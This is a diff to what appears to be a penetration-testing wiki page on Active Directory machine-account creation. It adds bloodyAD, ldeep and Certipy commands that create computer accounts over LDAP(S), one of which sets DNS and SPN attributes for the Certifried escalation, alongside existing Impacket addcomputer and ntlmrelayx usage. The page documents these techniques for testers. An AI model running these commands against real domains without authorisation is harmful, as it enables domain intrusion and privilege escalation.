@@ -71,6 +71,24 @@ The [Impacket](https://github.com/SecureAuthCorp/impacket) script [addcomputer](
 addcomputer.py -computer-name 'SHUTDOWN$' -computer-pass 'SomePassword' -dc-host $DomainController -domain-netbios $DOMAIN 'DOMAIN\anonymous:anonymous'
 ```
 
+[bloodyAD](https://github.com/CravateRouge/bloodyAD) (Python) creates the account over LDAP(S).
+
+```bash
+bloodyad -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --host "$DC_HOST" add computer 'SomeName$' 'SomePassword'
+```
+
+[ldeep](https://github.com/franc-pentest/ldeep) (Python):
+
+```bash
+ldeep ldap -u "$USER" -p "$PASSWORD" -d "$DOMAIN" -s ldap://"$DC_HOST" create_computer 'SomeName$' 'SomePassword'
+```
+
+[Certipy](https://github.com/ly4k/Certipy) (Python) creates the account over LDAPS and can set its `dNSHostName`/UPN/SPNs in one shot (handy for [Certifried](/ad/movement/ad-cs/certifried)).
+
+```bash
+certipy account create -username "$USER@$DOMAIN" -password "$PASSWORD" -dc-ip "$DC_HOST" -user 'SomeName$' -pass 'SomePassword' -dns 'SomeName.$DOMAIN'
+```
+
 Testers can also use [ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) instead with the `--add-computer` option, like [this](https://arkanoidctf.medium.com/hackthebox-writeup-forest-4db0de793f96)
 
 <Callout type="info">
